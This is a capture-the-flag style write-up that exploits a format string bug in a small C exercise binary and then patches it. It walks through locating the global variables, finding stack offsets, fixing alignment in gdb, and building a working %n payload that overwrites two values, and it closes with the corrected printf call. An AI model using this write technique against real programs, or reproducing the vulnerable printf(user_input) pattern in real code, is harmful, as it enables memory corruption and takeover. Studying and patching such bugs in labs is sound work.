Let's take a look at the C code...

```
#include <stdio.h>
#include <stdlib.h>

int target0 = 0;
int target1 = 0;

void fun0()
	{
	char buf0[100];
	fgets(buf0, sizeof(buf0), stdin);
	printf(buf0);

	if (target0 == 0xace5 && target1 == 0xfacade)
		{
		printf("There's a line between taking advantage, and downright exploiting. You have crossed that line. Level Cleared\n");
		}
	printf("The value of target0 is %x\n", target0);
	printf("The value of target1 is %x\n", target1);
	}

int main()
{
	fun0();
}
```

So we can see that this level is similar to the previous level. We will have to use the format string exploit caused by the printf to change the value of the integers that are being evaluated. However this time we have to write to two different integers. First let's find the static address of the "target0" and "target1" global integers.

```
$	objdump -t f3 | grep target
0804a048 g     O .bss	00000004              target0
0804a04c g     O .bss	00000004              target1
```

So the address for target0 is "0x804a048", and the address for target1 is "0x804a04c". Now we will need to find where our input is on the stack, in relation to the printf. Let's find out where the first address is stored first.

```
$	python -c 'print "\x48\xa0\x04\x08" + "%x.%2$x.%3$x.%4$x.%5$x.%6$x.%7$x.%8$x.%9$x"' | ./f3
H�64.f7faf5a0.f0b5ff.ffffd00e.1.804a048.252e7825.2e782432.78243325
The value of target0 is 0
The value of target1 is 0
$	python -c 'print "\x48\xa0\x04\x08" + "%6$x"' | ./f3
H�804a048
The value of target0 is 0
The value of target1 is 0
```

So we know that the address is stored 6 DWORDS down the stack. Now to find the location of the second address.

```
$	python -c 'print "\x48\xa0\x04\x08" + "%6$x" + "\x4c\xa0\x04\x08" + ".%7$x.%8$x.%9$x"' | ./f3
H�804a048L�.78243625.804a04c.2437252e
The value of target0 is 0
The value of target1 is 0
$	python -c 'print "\x48\xa0\x04\x08" + "%6$x" + "\x4c\xa0\x04\x08" + "%8$x"' | ./f3
H�804a048L�804a04c
The value of target0 is 0
The value of target1 is 0
```

So we can that with our current format, the second address is 8 DWORDS away. Let's try writing to both address to test it.

```
$	python -c 'print "\x48\xa0\x04\x08" + "%6$n" + "\x4c\xa0\x04\x08" + "%8$n"' | ./f3
H�L�
The value of target0 is 4
The value of target1 is 8
```

So we can see, we are able to write to both variables. However for target0 we wrote 4 bytes and for target1 we wrote 8 bytes. This is because each character that get's printed is written to each each address. When it writes to target0, only the four characters from the target0 address are written so it will only write four bytes. When it gets to the second address, when it prints the addres itself it will add an additional 4 characters to it making a total of 8 bytes. The "%6$n" and "%8$n" are considered to be arguments for the printf function so they don't count.

Now the two values we have to write are 0xace5 to target0 and 0xfacade to target1. Since 0xfacade is bigger than 0xace5, we should write to target0 first, then write to target1. Now let's figure out how many additional characters we should have to write to target0 to make it reach 0xace5.

```
$	python
Python 2.7.12 (default, Nov 19 2016, 06:48:10) 
[GCC 5.4.0 20160609] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> 0xace5
44261
>>> 0xace5 - 4
44257
>>> exit()
```

So we should have to write 44257 additional characters to target0 to get it to the value we want. Let's try it using the same method from the previous level.

```
$	python -c 'print "\x48\xa0\x04\x08" + "%44257x%6$" + "\x4c\xa0\x04\x08" + "%8$n"' | ./f3
Segmentation fault (core dumped)
```

So that didn't work, we screwed up the format. Let's take a look at how exactly it is stored in memory using gdb.

```
$	python -c 'print "\x48\xa0\x04\x08" + "%44257x%6$" + "\x4c\xa0\x04\x08" + "%8$n"' > payload
$	gdb ./f3
```

One wall of text later...

```
gdb-peda$ disas fun0
Dump of assembler code for function fun0:
   0x080484eb <+0>:	push   ebp
   0x080484ec <+1>:	mov    ebp,esp
   0x080484ee <+3>:	sub    esp,0x78
   0x080484f1 <+6>:	mov    eax,gs:0x14
   0x080484f7 <+12>:	mov    DWORD PTR [ebp-0xc],eax
   0x080484fa <+15>:	xor    eax,eax
   0x080484fc <+17>:	mov    eax,ds:0x804a040
   0x08048501 <+22>:	sub    esp,0x4
   0x08048504 <+25>:	push   eax
   0x08048505 <+26>:	push   0x64
   0x08048507 <+28>:	lea    eax,[ebp-0x70]
   0x0804850a <+31>:	push   eax
   0x0804850b <+32>:	call   0x80483a0 <fgets@plt>
   0x08048510 <+37>:	add    esp,0x10
   0x08048513 <+40>:	sub    esp,0xc
   0x08048516 <+43>:	lea    eax,[ebp-0x70]
   0x08048519 <+46>:	push   eax
   0x0804851a <+47>:	call   0x8048390 <printf@plt>
   0x0804851f <+52>:	add    esp,0x10
   0x08048522 <+55>:	mov    eax,ds:0x804a048
   0x08048527 <+60>:	cmp    eax,0xace5
   0x0804852c <+65>:	jne    0x804854a <fun0+95>
   0x0804852e <+67>:	mov    eax,ds:0x804a04c
   0x08048533 <+72>:	cmp    eax,0xfacade
   0x08048538 <+77>:	jne    0x804854a <fun0+95>
   0x0804853a <+79>:	sub    esp,0xc
   0x0804853d <+82>:	push   0x8048630
   0x08048542 <+87>:	call   0x80483c0 <puts@plt>
   0x08048547 <+92>:	add    esp,0x10
   0x0804854a <+95>:	mov    eax,ds:0x804a048
   0x0804854f <+100>:	sub    esp,0x8
   0x08048552 <+103>:	push   eax
   0x08048553 <+104>:	push   0x804869d
   0x08048558 <+109>:	call   0x8048390 <printf@plt>
   0x0804855d <+114>:	add    esp,0x10
   0x08048560 <+117>:	mov    eax,ds:0x804a04c
   0x08048565 <+122>:	sub    esp,0x8
   0x08048568 <+125>:	push   eax
   0x08048569 <+126>:	push   0x80486b9
   0x0804856e <+131>:	call   0x8048390 <printf@plt>
   0x08048573 <+136>:	add    esp,0x10
   0x08048576 <+139>:	nop
   0x08048577 <+140>:	mov    eax,DWORD PTR [ebp-0xc]
   0x0804857a <+143>:	xor    eax,DWORD PTR gs:0x14
   0x08048581 <+150>:	je     0x8048588 <fun0+157>
   0x08048583 <+152>:	call   0x80483b0 <__stack_chk_fail@plt>
   0x08048588 <+157>:	leave  
   0x08048589 <+158>:	ret    
End of assembler dump.
gdb-peda$ b *fun0+37
Breakpoint 1 at 0x8048510
gdb-peda$ r < payload
Starting program: /Hackery/escape/fmt_str/f3/f3 < payload

 [----------------------------------registers-----------------------------------]
EAX: 0xffffcf88 --> 0x804a048 --> 0x0 
EBX: 0x0 
ECX: 0x0 
EDX: 0xf7fb087c --> 0x0 
ESI: 0xf7faf000 --> 0x1b1db0 
EDI: 0xf7faf000 --> 0x1b1db0 
EBP: 0xffffcff8 --> 0xffffd008 --> 0x0 
ESP: 0xffffcf70 --> 0xffffcf88 --> 0x804a048 --> 0x0 
EIP: 0x8048510 (<fun0+37>:	add    esp,0x10)
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x8048507 <fun0+28>:	lea    eax,[ebp-0x70]
   0x804850a <fun0+31>:	push   eax
   0x804850b <fun0+32>:	call   0x80483a0 <fgets@plt>
=> 0x8048510 <fun0+37>:	add    esp,0x10
   0x8048513 <fun0+40>:	sub    esp,0xc
   0x8048516 <fun0+43>:	lea    eax,[ebp-0x70]
   0x8048519 <fun0+46>:	push   eax
   0x804851a <fun0+47>:	call   0x8048390 <printf@plt>
[------------------------------------stack-------------------------------------]
0000| 0xffffcf70 --> 0xffffcf88 --> 0x804a048 --> 0x0 
0004| 0xffffcf74 --> 0x64 ('d')
0008| 0xffffcf78 --> 0xf7faf5a0 --> 0xfbad2088 
0012| 0xffffcf7c --> 0xf0b5ff 
0016| 0xffffcf80 --> 0xffffcfbe --> 0xffff0000 --> 0x0 
0020| 0xffffcf84 --> 0x1 
0024| 0xffffcf88 --> 0x804a048 --> 0x0 
0028| 0xffffcf8c ("%44257x%6$L\240\004\b%8$n\n")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x08048510 in fun0 ()
```

So we can see here, that the address of target0 is stored properly in it's own DWORD, which is 4 bytes long (just enough to hold the address). Now let's look a little farther down to see if the address for target1 is stored properly.

```
gdb-peda$ x/5w 0xffffcf88
0xffffcf88:	0x0804a048	0x32343425	0x36253735	0xa04c6e24
0xffffcf98:	0x38250804
gdb-peda$ x/w 0xffffcf88
0xffffcf88:	0x0804a048
gdb-peda$ x/w 0xffffcf94
0xffffcf94:	0xa04c2436
gdb-peda$ x/w 0xffffcf98
0xffffcf98:	0x38250804
```

So we can see here that the address for target1 (0x804a04c) is split between the DWORDS at 0xffffcf94 (has 0xa04c) and 0xffffcf98 (has 0x0804). So we will need to format it so they are all in the same DWORD. We can do that by adding additional characters. First off if we count the amount of characters in between the two addresses (%44257x%6$n), we see that there are 11 characters which is 7 more than the original "%6$n" string. Since DWORDS are 4 bytes long, we should be able to add one additional character to the end of that string which should move the address of target1 into it's own DWORD. Of course since we effictively added 8 characters, we have moved the location of the target1 address to two DWORDS down. Let's test all of this.

```
$	python -c 'print "\x48\xa0\x04\x08" + "%44257x%6$n0" + "\x4c\xa0\x04\x08" + "%10$n"' > payload
```

Now let's look at the momery after we've run the exploit.

```
Breakpoint 1, 0x08048510 in fun0 ()
gdb-peda$ x/4x 0xffffcf88
0xffffcf88:	0x48	0xa0	0x04	0x08
gdb-peda$ x/w 0xffffcf88
0xffffcf88:	0x0804a048
gdb-peda$ x/6w 0xffffcf88
0xffffcf88:	0x0804a048	0x32343425	0x25783735	0x306e2436
0xffffcf98:	0x0804a04c	0x24303125
gdb-peda$ x/w 0xffffcf98
0xffffcf98:	0x0804a04c
```

As you can see, the addresses are properly stored. Also if you count the amount of DWORDS in between the two addresses, you see that it aligns with our exploit. Now let's try it outside of gdb.

```
$	python -c 'print "\x48\xa0\x04\x08" + "%44257x%6$n0" + "\x4c\xa0\x04\x08" + "%10$n"' | ./f3
```

One wall of blank space later (keep in mind that all of the characters we are writing with "%44257x" the program is trying to print).

```
                 640L�
The value of target0 is ace5
The value of target1 is acea
```

So we were able to write the correct value to target0 (0xace5). Now we need to write the hex string 0xfacade to target1. Already we are writing the hex string acea to it, so we can figure out the difference using python.

```
>>> 0xfacade - 0xacea
16391668
``` 

So according to that, we only need to write 16391668 more characters to target1 to get it equal to the proper value. Since there aren't any addresses after where we will put the "%16391668x", we shouldn't have to worry about formating.

```
$	python -c 'print "\x48\xa0\x04\x08" + "%44257x%6$n0" + "\x4c\xa0\x04\x08" + "%16391668x%10$n"' | ./f3
```

One wall of text later...

```
  f7faf5a0
There's a line between taking advantage, and downright exploiting. You have crossed that line. Level Cleared
The value of target0 is ace5
The value of target1 is facade
```

Just like that, we pwned the binary! Now to patch it.

```
#include <stdio.h>
#include <stdlib.h>

int target0 = 0;
int target1 = 0;

void fun0()
	{
	char buf0[100];
	fgets(buf0, sizeof(buf0), stdin);
	printf("%s\n", buf0);

	if (target0 == 0xace5 && target1 == 0xfacade)
		{
		printf("There's a line between taking advantage, and downright exploiting. You have crossed that line. Level Cleared\n");
		}
	printf("The value of target0 is %x\n", target0);
	printf("The value of target1 is %x\n", target1);
	}

int main()
{
	fun0();
}
```

As you can see, we are mnow printing user defined data, formatted as a string which should stop the format string exploits. Let's test it.

```
$	./f3_secure 
0000.%x.%x.%x.%x
0000.%x.%x.%x.%x

The value of target0 is 0
The value of target1 is 0
```

Just like that, we patched the binary!